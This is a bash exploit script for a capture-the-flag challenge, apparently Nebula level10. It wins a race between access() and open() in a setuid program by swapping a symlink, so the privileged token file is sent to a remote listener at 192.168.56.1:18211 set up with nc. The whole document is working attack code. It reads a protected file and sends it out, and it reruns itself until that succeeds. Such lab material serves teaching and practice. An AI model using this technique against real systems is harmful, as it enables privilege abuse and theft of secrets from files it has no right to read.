#!/bin/bash
##
# this particular challenge has a race condition
# between the access(3) and open(3). we try and
# change the file via a symbolic link. if we don't
# succeed we try it again.
#
# currently connects to 192.168.56.1 on port 18211
# run
#  `nc -l 18211 | grep -v ".oO Oo."` on the REMOTE
#
# the remote host will receive the password of the
# user flag10.
##
# clean up previous files
rm -f ~/switch ~/flag10.log
# make a switch for race condition
ln -s /etc/resolv.conf ~/switch
# run the applications in the background
/home/flag10/flag10 ~/switch 192.168.56.1 > ~/flag10.log 2> /dev/null &
# change the switch to the token
ln -fs /home/flag10/token ~/switch
 
# forever ...
while [[ 1 ]]
do
	# does the log file exists?
	[[ -f ~/flag10.log ]] & break
done

# have we written the token?
grep "wrote file" ~/flag10.log
if [[ $? -ne 0 ]] # check return
then
	# we haven't, run it again
	$0 > /dev/null 2> /dev/null
fi

# clean up
rm -f ~/switch ~/flag10.log
